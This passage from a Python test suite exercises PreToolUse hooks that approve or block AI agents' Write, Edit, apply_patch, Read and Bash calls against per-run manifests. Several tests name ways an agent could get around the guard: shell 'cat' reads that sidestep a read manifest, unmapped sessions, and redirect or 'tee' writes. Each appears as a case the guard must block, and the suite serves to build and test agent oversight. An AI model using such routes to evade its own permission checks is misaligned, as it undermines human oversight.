                    "workspace/ir/p/spec.ir.yaml",
                ],
            )
            self.assertNotIn("patch", entry.get("payload_summary", {}))

    def test_codex_raw_apply_patch_blocks_when_session_mapping_not_found(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_apply_patch_guard_allow_unresolved"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            target_path = "workspace/pipelines/safe/spec.ir.yaml"
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "session_id": "sess_apply_patch_unresolved_001",
                "tool_input": {
                    "patch": (
                        "*** Begin Patch\n"
                        f"*** Add File: {target_path}\n"
                        "+case: unresolved-allow\n"
                        "*** End Patch\n"
                    )
                },
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("session-to-run mapping not found", body.get("reason", ""))
            self.assertIn("Edit/Write", body.get("reason", ""))

    def test_bash_audit_redacts_capability_token(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_audit_redact_001"
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {
                    "command": (
                        "python3 tools/orchestration_runtime.py guarded-apply-patch "
                        "--capability-token secret-token-123"
                    )
                },
            }
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                code = cli.main(
                    [
                        "--backend",
                        "codex",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
            # A Codex PreToolUse file-access event without a session mapping
            # must fail closed; audit logging still redacts the token.
            self.assertEqual(code, 2)
            log_path = (
                repo_root
                / "workspace"
                / "orchestrations"
                / orch
                / "hooks"
                / "native_hook_events.jsonl"
            )
            entry = json.loads(log_path.read_text(encoding="utf-8").splitlines()[-1])
            command_summary = entry.get("payload_summary", {}).get("command", "")
            self.assertIn("--capability-token <redacted>", command_summary)
            self.assertNotIn("secret-token-123", command_summary)

    def test_claude_file_tool_allows_orchestration_agent_write_when_path_is_allowed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_005"
            run_id = "orch_agent_001"
            allowed_path = "workspace/pipelines/safe/out.txt"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "orchestration_meta.json").write_text(
                json.dumps({"orchestration_agent_run_id": run_id}, ensure_ascii=False),
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [allowed_path],
                        "allowed_file_tool_paths": [allowed_path],
                        "write_roots": ["workspace/pipelines/safe"],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "tool_input": {"file_path": allowed_path},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body_text = out.getvalue().strip()
            self.assertTrue(body_text, "hook must emit hookSpecificOutput for permission auto-approve")
            body = json.loads(body_text)
            hso = body.get("hookSpecificOutput") or {}
            self.assertEqual(hso.get("permissionDecision"), "allow")
            self.assertEqual(hso.get("hookEventName"), "PreToolUse")

    def test_claude_file_tool_allows_orchestration_agent_edit_failure_analysis_json(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_failure_analysis_001"
            run_id = "orch_agent_failure_analysis_001"
            target_path = f"workspace/orchestrations/{orch}/failure_analysis.json"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "orchestration_meta.json").write_text(
                json.dumps({"orchestration_agent_run_id": run_id}, ensure_ascii=False),
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target_path],
                        "allowed_file_tool_paths": [target_path],
                        "write_roots": [f"workspace/orchestrations/{orch}"],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Edit",
                "tool_input": {"file_path": target_path},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body_text = out.getvalue().strip()
            self.assertTrue(body_text, "hook must emit hookSpecificOutput for permission auto-approve")
            body = json.loads(body_text)
            hso = body.get("hookSpecificOutput") or {}
            self.assertEqual(hso.get("permissionDecision"), "allow")
            self.assertEqual(hso.get("hookEventName"), "PreToolUse")

    def test_claude_raw_apply_patch_allows_when_failure_analysis_json_is_in_allowlist(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_failure_analysis_002"
            run_id = "orch_agent_failure_analysis_002"
            target_path = f"workspace/orchestrations/{orch}/failure_analysis.json"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "orchestration_meta.json").write_text(
                json.dumps({"orchestration_agent_run_id": run_id}, ensure_ascii=False),
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target_path],
                        "allowed_file_tool_paths": [target_path],
                        "write_roots": [f"workspace/orchestrations/{orch}"],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "tool_input": {
                    "patch": (
                        "*** Begin Patch\n"
                        f"*** Add File: {target_path}\n"
                        "+{}\n"
                        "*** End Patch\n"
                    )
                },
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body_text = out.getvalue().strip()
            if body_text:
                body = json.loads(body_text)
                self.assertEqual(body.get("decision"), "allow")

    def test_claude_raw_apply_patch_blocks_when_target_not_in_allowed_file_tool_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_failure_analysis_003"
            run_id = "orch_agent_failure_analysis_003"
            target_path = f"workspace/orchestrations/{orch}/failure_analysis.json"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "orchestration_meta.json").write_text(
                json.dumps({"orchestration_agent_run_id": run_id}, ensure_ascii=False),
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target_path],
                        "allowed_file_tool_paths": [],
                        "write_roots": [f"workspace/orchestrations/{orch}"],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "tool_input": {
                    "patch": (
                        "*** Begin Patch\n"
                        f"*** Add File: {target_path}\n"
                        "+{}\n"
                        "*** End Patch\n"
                    )
                },
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("allowed_file_tool_paths", body.get("reason", ""))

    def test_claude_file_tool_blocks_when_active_agent_run_id_file_empty(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_006"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            (orch_root / "active_child_agent_run_id.txt").write_text("   \n", encoding="utf-8")
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Read",
                "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("active child agent_run_id is empty", body.get("reason", ""))
            self.assertIn("orchestration_read", body.get("reason", ""))

    def test_claude_file_tool_blocks_orchestration_agent_write_when_path_not_in_file_tool_allowlist(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_006b"
            run_id = "orch_agent_006b"
            target_path = "workspace/pipelines/safe/failure_analysis.json"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "orchestration_meta.json").write_text(
                json.dumps({"orchestration_agent_run_id": run_id}, ensure_ascii=False),
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target_path],
                        "allowed_file_tool_paths": [],
                        "write_roots": ["workspace/pipelines/safe"],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "tool_input": {"file_path": target_path},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("allowed_file_tool_paths", body.get("reason", ""))

    def test_claude_write_blocks_with_manifest_hint_when_output_manifest_invalid(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_007"
            run_id = "step_run_build_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "active_child_agent_run_id.txt").write_text(run_id, encoding="utf-8")
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                "{invalid-json",
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("invalid JSON", body.get("reason", ""))
            self.assertIn("Ensure record-launch generated the manifest", body.get("reason", ""))

    def test_codex_read_blocks_with_manifest_hint_when_read_manifest_missing(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_008"
            run_id = "step_run_build_001"
            session_id = "sess_step_build_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            (orch_root / "agent_runs.jsonl").write_text(
                json.dumps(
                    {
                        "agent_run_id": run_id,
                        "agent_backend": "codex",
                        "agent_session_id": session_id,
                    }
                )
                + "\n",
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Read",
                "session_id": session_id,
                "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("read manifest not found", body.get("reason", ""))
            self.assertIn("Ensure record-launch generated the manifest", body.get("reason", ""))

    def test_codex_pure_bash_blocks_readonly_repository_command(self) -> None:
        """A pure Codex leaf must not bypass its empty read manifest via `cat`."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_pure_shell_001"
            run_id = "substep_run_pure_001"
            session_id = "thread_pure_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            cap_dir = orch_root / "capabilities"
            cap_dir.mkdir(parents=True, exist_ok=True)
            (cap_dir / f"{run_id}.json").write_text(
                json.dumps({"mode": "pure_readonly", "write_roots": []}),
                encoding="utf-8",
            )
            (orch_root / "agent_runs.jsonl").write_text(
                json.dumps({
                    "agent_run_id": run_id,
                    "agent_backend": "codex",
                    "agent_session_id": session_id,
                }) + "\n",
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "session_id": session_id,
                "tool_input": {"command": "cat workspace/pipelines/prior/source_meta.json"},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend", "codex", "--event", "PreToolUse",
                            "--input-json", json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("may not invoke Bash or Shell", body.get("reason", ""))

    def test_codex_unmapped_bash_blocks_before_readonly_auto_approval(self) -> None:
        """A missing Codex session index must not let `cat` bypass pure policy."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            payload = {
                "orchestration_id": "orch_unmapped_shell_001",
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "session_id": "unknown-thread",
                "tool_input": {"command": "cat workspace/pipelines/prior/source_meta.json"},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend", "codex", "--event", "PreToolUse",
                            "--input-json", json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("session-to-run mapping not found", body.get("reason", ""))

    def test_codex_bootstrap_child_binding_blocks_pure_shell_before_thread_index(self) -> None:
        """The inherited child id closes the thread.started-to-hook race."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_bootstrap_shell_001"
            run_id = "substep_run_bootstrap_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "capabilities").mkdir(parents=True, exist_ok=True)
            (orch_root / "active_children").mkdir(parents=True, exist_ok=True)
            (orch_root / "capabilities" / f"{run_id}.json").write_text(
                json.dumps({"mode": "pure_readonly", "write_roots": []}), encoding="utf-8"
            )
            (orch_root / "active_children" / f"{run_id}.txt").write_text(run_id, encoding="utf-8")
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "session_id": "thread-not-yet-indexed",
                "tool_input": {"command": "cat workspace/pipelines/prior/source_meta.json"},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {
                    "METDSL_WORKFLOW_MODE": "1",
                    "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0",
                    "METDSL_CHILD_AGENT_RUN_ID": run_id,
                },
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        ["--backend", "codex", "--event", "PreToolUse",
                         "--input-json", json.dumps(payload)]
                    )
            self.assertEqual(code, 2)
            self.assertIn("may not invoke Bash or Shell", json.loads(out.getvalue())["reason"])


class GetAgentRoleFromCapabilityTests(unittest.TestCase):
    """`_get_agent_role_from_capability` resolution including orchestration fallback."""

    def test_returns_role_from_capability_file(self) -> None:
        from tools.hooks.cli import _get_agent_role_from_capability
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            cap_dir = repo / "workspace" / "orchestrations" / "orch_x" / "capabilities"
            cap_dir.mkdir(parents=True)
            (cap_dir / "run_step.json").write_text(
                json.dumps({"agent_role": "step"}), encoding="utf-8"
            )
            self.assertEqual(
                _get_agent_role_from_capability(repo, "orch_x", "run_step"),
                "step",
            )

    def test_falls_back_to_orchestration_meta_for_orchestration_agent(self) -> None:
        """Regression: orchestration agent has no capability file. Role must
        be resolved from orchestration_meta.json so auto-read tolerance and
        the auto_read_expected_block classification work via the CLI path."""
        from tools.hooks.cli import _get_agent_role_from_capability
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            orch_root = repo / "workspace" / "orchestrations" / "orch_x"
            orch_root.mkdir(parents=True)
            (orch_root / "orchestration_meta.json").write_text(
                json.dumps({
                    "orchestration_agent_run_id": "run_orch_001",
                    "orchestration_id": "orch_x",
                }),
                encoding="utf-8",
            )
            self.assertEqual(
                _get_agent_role_from_capability(repo, "orch_x", "run_orch_001"),
                "orchestration",
            )

    def test_returns_none_for_unknown_agent(self) -> None:
        from tools.hooks.cli import _get_agent_role_from_capability
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            orch_root = repo / "workspace" / "orchestrations" / "orch_x"
            orch_root.mkdir(parents=True)
            (orch_root / "orchestration_meta.json").write_text(
                json.dumps({"orchestration_agent_run_id": "run_orch_001"}),
                encoding="utf-8",
            )
            self.assertIsNone(
                _get_agent_role_from_capability(repo, "orch_x", "run_unknown")
            )


class WriteToolExtensionPolicyTests(unittest.TestCase):
    """Verify the per-extension policy of direct `Edit` / `Write` writes."""

    def _setup_orchestration_for_write(
        self,
        repo_root: Path,
        *,
        orch: str,
        run_id: str,
        allowed_output_paths: list[str],
        allowed_file_tool_paths: list[str],
        allowed_tmp_root: str | None = None,
    ) -> None:
        orch_root = repo_root / "workspace" / "orchestrations" / orch
        (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
        (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
        (orch_root / "active_child_agent_run_id.txt").write_text(run_id, encoding="utf-8")
        manifest: dict = {
            "orchestration_id": orch,
            "agent_run_id": run_id,
            "allowed_output_paths": allowed_output_paths,
            "allowed_file_tool_paths": allowed_file_tool_paths,
            "write_roots": ["workspace/ir"],
        }
        if allowed_tmp_root is not None:
            manifest["allowed_tmp_root"] = allowed_tmp_root
        (orch_root / "output_manifests" / f"{run_id}.json").write_text(
            json.dumps(manifest),
            encoding="utf-8",
        )

    def _invoke_write_hook(self, *, orch: str, repo_root: Path, file_path: str) -> tuple[int, dict]:
        payload = {
            "orchestration_id": orch,
            "repo_root": str(repo_root),
            "tool_name": "Write",
            "tool_input": {"file_path": file_path},
        }
        out = io.StringIO()
        with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
            with redirect_stdout(out):
                code = cli.main(
                    [
                        "--backend",
                        "claude",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
        body_text = out.getvalue().strip()
        body: dict = json.loads(body_text) if body_text else {}
        return code, body

    def test_write_tool_blocks_json_path_even_when_listed_in_allowed_outputs(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_ext_hooks_001"
            run_id = "step_run_ext_hooks_001"
            json_path = "workspace/ir/p/spec.ir.yaml"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=[json_path],
                allowed_file_tool_paths=[],
            )
            code, body = self._invoke_write_hook(
                orch=orch, repo_root=repo_root, file_path=json_path
            )
            self.assertEqual(code, 2)
            self.assertEqual(body.get("decision"), "block")
            # A path in allowed_output_paths but NOT in allowed_file_tool_paths is not
            # Edit/Write-eligible; the recovery is to add it to allowed_file_tool_paths
            # (no longer guarded-apply-patch, which is deprecated under Phase-2).
            self.assertIn("allowed_file_tool_paths", body.get("reason", ""))

    def test_write_tool_allows_yaml_when_listed_in_allowed_file_tool_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_ext_hooks_002"
            run_id = "step_run_ext_hooks_002"
            yaml_path = "workspace/ir/p/spec.ir.yaml"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=[yaml_path],
                allowed_file_tool_paths=[yaml_path],
            )
            code, body = self._invoke_write_hook(
                orch=orch, repo_root=repo_root, file_path=yaml_path
            )
            self.assertEqual(code, 0)
            self.assertTrue(body, "hook must emit hookSpecificOutput for permission auto-approve")
            self.assertEqual((body.get("hookSpecificOutput") or {}).get("permissionDecision"), "allow")

    def test_write_tool_allows_markdown_when_listed_in_allowed_file_tool_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_ext_hooks_003"
            run_id = "step_run_ext_hooks_003"
            md_path = "workspace/ir/p/notes.md"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=[md_path],
                allowed_file_tool_paths=[md_path],
            )
            code, body = self._invoke_write_hook(
                orch=orch, repo_root=repo_root, file_path=md_path
            )
            self.assertEqual(code, 0)
            self.assertTrue(body, "hook must emit hookSpecificOutput for permission auto-approve")
            self.assertEqual((body.get("hookSpecificOutput") or {}).get("permissionDecision"), "allow")

    def test_write_tool_allows_source_code_when_listed_in_allowed_file_tool_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_ext_hooks_004"
            run_id = "step_run_ext_hooks_004"
            src_path = "workspace/ir/p/src/main.f90"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=[src_path],
                allowed_file_tool_paths=[src_path],
            )
            code, body = self._invoke_write_hook(
                orch=orch, repo_root=repo_root, file_path=src_path
            )
            self.assertEqual(code, 0)
            self.assertTrue(body, "hook must emit hookSpecificOutput for permission auto-approve")
            self.assertEqual((body.get("hookSpecificOutput") or {}).get("permissionDecision"), "allow")

    def test_write_tool_blocks_yaml_when_not_listed_in_allowed_file_tool_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_ext_hooks_005"
            run_id = "step_run_ext_hooks_005"
            yaml_path = "workspace/ir/p/spec.ir.yaml"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=[yaml_path],
                allowed_file_tool_paths=[],
            )
            code, body = self._invoke_write_hook(
                orch=orch, repo_root=repo_root, file_path=yaml_path
            )
            self.assertEqual(code, 2)
            self.assertEqual(body.get("decision"), "block")

    def test_write_tool_blocks_cli_managed_internal_paths(self) -> None:
        # `.request.input.json` / `.agent_run.input.json` are the payload files the
        # conductor hands to record-launch / finalize-child and keeps as evidence of
        # what was actually sent; a leaf editing one would rewrite that evidence.
        for suffix in ("reply.txt", "request.input.json", "agent_run.input.json"):
            with self.subTest(suffix=suffix), tempfile.TemporaryDirectory() as tmp:
                repo_root = Path(tmp)
                orch = "orch_ext_hooks_006"
                run_id = "step_run_ext_hooks_006"
                cli_managed_path = (
                    f"workspace/orchestrations/{orch}/launches/{run_id}.{suffix}"
                )
                self._setup_orchestration_for_write(
                    repo_root,
                    orch=orch,
                    run_id=run_id,
                    allowed_output_paths=[cli_managed_path],
                    allowed_file_tool_paths=[cli_managed_path],
                )
                code, body = self._invoke_write_hook(
                    orch=orch, repo_root=repo_root, file_path=cli_managed_path
                )
                self.assertEqual(code, 2)
                self.assertEqual(body.get("decision"), "block")

    def test_write_tool_auto_approves_scratch_under_allowed_tmp_root(self) -> None:
        """PIN: a Write under `allowed_tmp_root` is auto-approved for EVERY extension.

        This pins behavior that predates issue #73 (it passes on the parent commit); the
        issue only changed which route the contract instructs. It is the enforcement-side
        witness that the contract's single scratch route is admitted without an
        interactive permission decision, unlike a Bash redirect write, which matches no
        committed `permissions.allow` rule.

        The extension sweep pins that the tmp-root match precedes every extension rule in
        `validate_write_access` — it is NOT a sample of a list of allowed extensions.
        The path is deliberately absent from `allowed_file_tool_paths`, so only the
        tmp-root branch can produce the allow.
        """
        for ext in ("py", "yaml", "sh", "json", "txt"):
            with self.subTest(ext=ext), tempfile.TemporaryDirectory() as tmp:
                repo_root = Path(tmp)
                orch = "orch_tmp_scratch_001"
                run_id = "step_run_tmp_scratch_001"
                tmp_root = f"workspace/tmp/{run_id}"
                scratch_path = f"{tmp_root}/work.{ext}"
                self._setup_orchestration_for_write(
                    repo_root,
                    orch=orch,
                    run_id=run_id,
                    allowed_output_paths=["workspace/ir/p/spec.ir.yaml"],
                    allowed_file_tool_paths=["workspace/ir/p/spec.ir.yaml"],
                    allowed_tmp_root=tmp_root,
                )
                code, body = self._invoke_write_hook(
                    orch=orch, repo_root=repo_root, file_path=scratch_path
                )
                self.assertEqual(code, 0)
                self.assertEqual(
                    (body.get("hookSpecificOutput") or {}).get("permissionDecision"),
                    "allow",
                    f"Write to {scratch_path} must be auto-approved, not merely allowed",
                )

    # (surface, anchor for the sentence that states the scratch rule, scope).
    # scope "row" reads the last cell of the anchored table row (the remedy column);
    # scope "sentence" reads _STATEMENT_WINDOW characters from the anchor. Neither
    # reads the whole line: these surfaces state the ARTIFACT write rule on the same
    # line, and it names the same tool, so a line-wide match proves nothing.
    _SCRATCH_SURFACES = (
        ("docs/AGENT_CONTRACT.md", "When a temporary file is needed", "sentence"),
        ("docs/workflow/LAUNCH_PROMPT_REFERENCE.md", "Every extension alike", "sentence"),
        ("docs/RUNBOOK.md", "| `output_manifest_write_guard` |", "row"),
        ("docs/WORKSPACE_LAYOUT.md", "the place for", "sentence"),
        ("tools/prompt_templates/step_agent.txt", "For a temporary file", "sentence"),
        ("tools/prompt_templates/substep_agent.txt", "For a temporary file", "sentence"),
        # Operator-facing, but it states the same output_manifest_write_guard
        # remedy as docs/RUNBOOK.md; it drifted into a fourth wording once.
        ("skills/workflow-audit-claude/SKILL.md", "| output_manifest_write_guard |", "row"),
    )

    # Files scanned for a redirect into the tmp root. The scratch surfaces, plus
    # docs/CLI_REFERENCE.md — it taught the gate-stderr capture but states no scratch
    # rule, so it is not a _SCRATCH_SURFACES member and the other check must not read
    # it. One owner for the shared part: the file list is derived, not respelled.
    _REDIRECT_SURFACES = tuple(
        dict.fromkeys(
            [rel for rel, _anchor, _scope in _SCRATCH_SURFACES] + ["docs/CLI_REFERENCE.md"]
        )
    )

    # Long enough for every surface's own statement (measured longest: 132 chars from
    # anchor to the start of the tool name; 144 to its end, which is the true lower
    # bound), short enough to exclude the artifact-write sentence that follows it on
    # the same line (nearest: 699 chars from the anchor, in both templates).
    _STATEMENT_WINDOW = 200

    # `tee PATH` writes PATH with no redirect operator, so it needs its own
    # pattern; it is judged by the same rule (no allow entry names `tee`, so a
    # `| tee workspace/tmp/...` capture is refused as surely as `cat >` is).
    _REDIRECT = re.compile(
        r"\d?>>?\|?\s*[\"\']?(?:\./)?(workspace/tmp\S*)"
        r"|(?<=tee )(?:-\S+ )*[\"\']?(?:\./)?(workspace/tmp\S*)"
    )

    # Satisfied by naming the file tool, or by deferring to the canonical document
    # instead of restating the rule (this repository treats a restated rule as a
    # twin document, so a pointer must remain a legal answer). Tolerates the
    # emphasis spellings a normal doc edit produces: **Write** tool, `Write`-tool.
    _NAMES_THE_ROUTE = re.compile(r"[`*]*Write[`*]*[-\s]+tool|AGENT_CONTRACT\.md")

    # A span introduced by an explicit refusal marker is an NG example — the natural
